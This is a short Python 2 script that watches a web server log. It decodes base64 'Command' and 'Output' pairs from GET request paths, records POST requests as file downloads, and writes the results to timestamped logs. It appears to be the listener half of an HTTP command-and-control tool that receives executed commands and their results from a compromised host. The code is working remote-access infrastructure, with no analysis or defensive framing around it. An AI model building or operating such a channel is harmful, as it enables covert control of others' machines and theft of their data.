#!/usr/bin/python
import sys, os
import re
import base64
import time
import datetime

#############
##
## Simple Server that checks eguiHTTPS.py logs and prints back
## Saves to log file
## 
## Add more info here
#########################

# Generate Time as Log
t = time.localtime()
current_time = time.strftime("%H%M%S", t)
today = datetime.date.today()
LOG = str(today)+ '-' + current_time
#print LOG



oldInput = ""
Input = ""
Results = ""

#execfile('./egui-http.py &>> log.txt')

#os.system('python egui-http.py &>> log.txt')

while True:
     
    with open('./ServerRequirements/log.txt', 'r') as f:
        #info = f.readlines()
        #print 'Readed: ' + str(info)
        lineList = f.readlines() # read lines
        #lineList = info.readlines() 
        #print "lineList is: " + str(lineList)
        lastLine = lineList[len(lineList)-1] # read last linei
        #print "Last line is: " + lastLine # prints last line
            
        SearchStr = re.search(r'GET (.*?) HTTP', lastLine) # search for string between GET and HTTP.. which should be the base64
        SearchDL = re.search(r'POST (.*?) HTTP', lastLine)


        if SearchStr:
            #print SearchStr.groups() # prints if true
            Output = str(SearchStr.groups())
            
            try:  
                Input = base64.b64decode(Output.split("/")[1]) # Made a 2 instead of 1 because of SErverRequirements
                # Changed back to 1 instead of a 2 because I removed ServerRequirements directory
                #print Input
                Results = base64.b64decode(Output.split("/")[2])
                #print Results
            except IndexError:
                continue
            except TypeError:
                continue

            if Input != oldInput:
                print "Command: " + Input
                print "Output: " + Results
               
                # Save to Log
                f = open("./Logs/" + LOG + "-log.txt", "a")
                f.write(Input + '\n')
                f.write(Results + '\n')
                f.write('\n')
    
        elif SearchDL:
            #print SearchDL.groups()
            Output = str(SearchDL.groups())
            Input = str(SearchDL.groups())

            if Input != oldInput:
                print "File Downloaded"


    oldInput = Input
    oldResults = Results
    time.sleep(5)
